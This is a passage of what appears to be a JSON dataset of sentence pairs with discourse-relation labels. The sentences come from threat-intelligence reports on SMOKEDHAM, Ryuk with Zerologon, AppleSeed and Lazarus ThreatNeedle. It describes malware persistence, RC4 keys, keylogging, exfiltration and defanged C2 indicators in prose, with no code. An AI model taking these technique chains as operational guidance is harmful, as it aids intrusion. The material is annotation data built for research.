        "S2": "The backdoor uses the Data field to send command output to its C2 server.",
        "relation": "LIST"
    },
    {
        "S1": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "S2": "The backdoor uses the Data field to send command output to its C2 server.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "S2": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "S2": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "S2": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "S2": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "S2": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "S2": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "relation": "NEXT"
    },
    {
        "S1": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "S2": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "S2": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "S2": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "S2": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "relation": "MISC"
    },
    {
        "S1": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "S2": "Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.",
        "relation": "NEXT"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.",
        "relation": "NEXT"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "S2": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "S2": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.",
        "relation": "NEXT"
    },
    {
        "S1": "This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe.",
        "S2": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "S2": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": "NEXT"
    },
    {
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "relation": "NEXT"
    },
    {
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.",
        "relation": "NEXT"
    },
    {
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": "NEXT"
    },
    {
        "S1": "Update.exe was a Go based dropper created using the ScareCrow framework.",
        "S2": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": "NEXT"
    },
    {
        "S1": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "S2": "Bazar was introduced to the environment again with the delivery via phishing emails.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "S2": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "S2": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "S2": "The network indicators align similarly to the prior campaign and were noted by Kyle Ehmke in response to our last post pivoting off the prior report\u2019s intel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "S2": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
        "S2": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "relation": "MISC"
    },
    {
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "relation": "MISC"
    },
    {
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "relation": "MISC"
    },
    {
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "relation": "MISC"
    },
    {
        "S1": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "S2": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "S2": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "relation": "MISC"
    },
    {
        "S1": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "S2": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "relation": "MISC"
    },
    {
        "S1": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "S2": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "S2": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "relation": "NEXT"
    },
    {
        "S1": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "S2": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "S2": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "relation": "NEXT"
    },
    {
        "S1": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "S2": "After our previous report, @kyleehmke pivoted off of our prior Ryuk report and used the network data to link several of these domains which we saw in this case.",
        "relation": "MISC"
    },
    {
        "S1": "CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment.",
        "S2": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
        "relation": "LIST"
    },
    {
        "S1": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "S2": "On the first domain controller that the threat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "relation": "NEXT"
    },
    {
        "S1": "On the first domain controller that the threat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "S2": "Then they imported the PowerShell Active Directory module.",
        "relation": "NEXT"
    },
    {
        "S1": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "S2": "Shortly after, the DLL was called again via regsrv32.",
        "relation": "NEXT"
    },
    {
        "S1": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "S2": "The threat actor then ran this command a few times.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor then ran this command a few times.",
        "S2": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "relation": "MISC"
    },
    {
        "S1": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "S2": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "relation": "NEXT"
    },
    {
        "S1": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": "NEXT"
    },
    {
        "S1": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "S2": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
        "relation": "MISC"
    },
    {
        "S1": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "S2": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through spearphishing emails.",
        "S2": "The archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).",
        "S2": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "relation": "NEXT"
    },
    {
        "S1": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).",
        "S2": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "relation": "NEXT"
    },
    {
        "S1": "At first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload.",
        "S2": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "relation": "NEXT"
    },
    {
        "S1": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "S2": "At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Whenever in the code the malware needs to use a string, it takes the encrypted string and passes it into two functions to decrypt it.",
        "S2": "The second function \"string_decryptor\" gets the created data structure in the previous function and then decrypts the string and puts it in the same data structure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decryptor function first convert the input string in hex ascii format to binary by calling the hexascii_to_binary function on each two ascii characters (i.e. c3, 42, b1, 1d... in example 1).",
        "S2": "Most of the important API calls resolve dynamically during the run time using \"string_decryptor\" function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The AppleSeed payload has an export function named \"DllRegisterServer\" which will be called when the DLL is executed using RegSvr32.exe.",
        "S2": "Copy itself into \"C:\\ProgramData\\Software\\ESTsoft\\Common\" and rename itself as ESTCommon.dll to pretend it is a DLL that belongs to ESTsecurity company.",
        "relation": "NEXT"
    },
    {
        "S1": "Make itself persistent by creating the following registry key:",
        "S2": "In the next step it creates a Mutex to make sure it only infects a victim once.",
        "relation": "NEXT"
    },
    {
        "S1": "After sending the data to the server, the data is deleted from the victim's machine.",
        "S2": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After sending the data to the server, the data is deleted from the victim's machine.",
        "S2": "The keylogger function uses GetKeyState and GetKeyboardState to capture the pressed keys on the victim's machine and logs all keys per process into the log.txt file.",
        "relation": "MISC"
    },
    {
        "S1": "The ApppleSeed payload is using RC4 for encryption and decryption of the data.",
        "S2": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To generate RC4 key, it creates a Random buffer of 117 bytes by Calling CryptGenRandom and then uses CryptCreateHash and CryptHashData to adds the buffer into a MD5 hash object.",
        "S2": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "relation": "NEXT"
    },
    {
        "S1": "Then it calls CryptDeriveKey to generate the RC4 key.",
        "S2": "The RSA key is in hex ASCII format and has been decrypted using \"string_decryptor\" function.",
        "relation": "NEXT"
    },
    {
        "S1": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "S2": "This thread looks for txt, ppt, hwp, pdf, and doc files in the Desktop, Documents, Downloads and AppData\\Local\\Microsoft\\Windows\\INetCache\\IE directories and archives them to be ready to be exfiltrated to the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "relation": "MISC"
    },
    {
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": "NEXT"
    },
    {
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server.",
        "S2": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "relation": "NEXT"
    },
    {
        "S1": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "S2": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers registered accounts with a public email service, making sure the sender\u2019s email addresses looked similar to the medical center\u2019s real email address.",
        "S2": "The attackers were able to find this information on the medical center\u2019s public website.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "S2": "Among the compromised machines were those used by the administrators of the enterprise\u2019s IT infrastructure.",
        "relation": "MISC"
    },
    {
        "S1": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "S2": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "relation": "NEXT"
    },
    {
        "S1": "The attackers were able to find this information on the medical center\u2019s public website.",
        "S2": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "relation": "MISC"
    },
    {
        "S1": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "S2": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "S2": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "relation": "NEXT"
    },
    {
        "S1": "The content of the lure document was copied from an online post by a health clinic.",
        "S2": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "relation": "MISC"
    },
    {
        "S1": "Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems.",
        "S2": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "S2": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "relation": "MISC"
    },
    {
        "S1": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "S2": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "relation": "MISC"
    },
    {
        "S1": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "S2": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "relation": "MISC"
    },
    {
        "S1": "The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes.",
        "S2": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "relation": "NEXT"
    },
    {
        "S1": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "S2": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "relation": "MISC"
    },
    {
        "S1": "This group also utilized different types of spear-phishing attack.",
        "S2": "We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group.",
        "relation": "MISC"
    },
    {
        "S1": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": "NEXT"
    },
    {
        "S1": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "S2": "A few days later, the same host opened a different malicious document.",
        "relation": "NEXT"
    },
    {
        "S1": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "S2": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "S2": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "relation": "NEXT"
    },
    {
        "S1": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "S2": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "relation": "MISC"
    },
    {
        "S1": "It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.",
        "S2": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "relation": "NEXT"
    },
    {
        "S1": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "S2": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "S2": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "relation": "MISC"
    },
    {
        "S1": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "S2": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "S2": "Hardcoded proxy address in the malware",
        "relation": "MISC"
    },
    {
        "S1": "We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company.",
        "S2": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "relation": "MISC"
    },
    {
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": "MISC"
    },
    {
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence.",
        "relation": "MISC"
    },
    {
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "relation": "MISC"
    },
    {
        "S1": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "S2": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "S2": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "relation": "MISC"
    },
    {
        "S1": "When moving laterally, the actor uses ThreatNeedle installer-type malware in the process.",
        "S2": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "relation": "MISC"
    },
    {
        "S1": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "S2": "This final payload is the ThreatNeedle loader running in memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Upon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to \u201c7486513879852\u201c.",
        "S2": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware then creates a file named bcdbootinfo.tlp in the system folder containing the infection time and the random service name that is chosen.",
        "S2": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "relation": "NEXT"
    },
    {
        "S1": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": "NEXT"
    },
    {
        "S1": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "S2": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "relation": "NEXT"
    },
    {
        "S1": "This final payload is the ThreatNeedle loader running in memory.",
        "S2": "This component is responsible for loading the final backdoor payload into memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This final payload is the ThreatNeedle loader running in memory.",
        "S2": "This is a common trait in ThreatNeedle loaders.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": "MISC"
    },
    {
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "In order to do this, the malware uses several techniques to decrypt its payload:",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "- Loading the payload from itself after decrypting RC4 and decompression.",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "As we can see from the installer malware description, we suspect that the registry key was created by the installer component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to do this, the malware uses several techniques to decrypt its payload:",
        "S2": "- Loading the payload from itself after decrypting RC4 and decompression.",
        "relation": "NEXT"
    },
    {
        "S1": "- Loading the payload from the registry.",
        "S2": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Loading the payload from itself after one-byte XORing.",
        "S2": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "relation": "MISC"
    },
    {
